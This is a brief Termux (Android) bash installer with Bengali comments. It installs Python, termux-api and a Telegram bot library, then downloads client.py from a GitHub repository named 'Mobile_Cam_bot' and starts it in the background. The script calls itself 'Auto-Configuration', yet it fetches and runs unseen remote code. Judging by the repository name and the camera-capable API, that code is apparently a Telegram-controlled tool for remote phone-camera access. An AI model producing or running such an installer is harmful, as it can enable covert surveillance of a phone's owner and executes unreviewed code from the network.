#!/bin/bash

echo "🚀 Starting Auto-Configuration..."

# প্রয়োজনীয় প্যাকেজ ইনস্টল
pkg update -y
pkg install python termux-api -y
pip install pyTelegramBotAPI requests

# মূল ক্লায়েন্ট ফাইল ডাউনলোড
curl -O https://raw.githubusercontent.com/R8rAIHAN/R8rAIHAN_Mobile_Cam_bot/main/client.py

echo "✅ Setup Complete! Connecting to Bot..."

# স্ক্রিপ্টটি ব্যাকগ্রাউন্ডে রান করা
python client.py &
